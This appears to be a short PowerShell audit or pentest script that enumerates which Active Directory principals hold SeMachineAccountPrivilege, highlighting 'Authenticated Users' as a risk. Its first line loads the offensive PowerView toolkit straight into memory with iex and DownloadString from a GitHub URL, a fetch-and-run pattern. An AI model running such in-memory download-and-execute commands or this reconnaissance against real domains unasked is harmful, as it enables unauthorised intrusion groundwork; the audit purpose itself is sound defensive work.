# import powerview into memory
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1')

# get all sids with the SeMachineAccountPrivilege enabled
$SeMachineAccountPrivilege=(Get-DomainPolicy -Policy DC).PrivilegeRights.SEMachineAccountPrivilege

# resolve all sids to groups and print the results
ForEach($sid in $SeMachineAccountPrivilege)
{
  $resource=(Convert-SidToName $sid.Substring(1))
  if($resource -eq "Authenticated Users")
  {
    Write-Host "$($resource) has the SeMachineAccountPrivileges privileges" -ForegroundColor Black -BackgroundColor Red
  }
  else
  {
    Write-Host "$($resource) has the SeMachineAccountPrivileges privileges" -ForegroundColor Black -BackgroundColor Yellow
  }
}
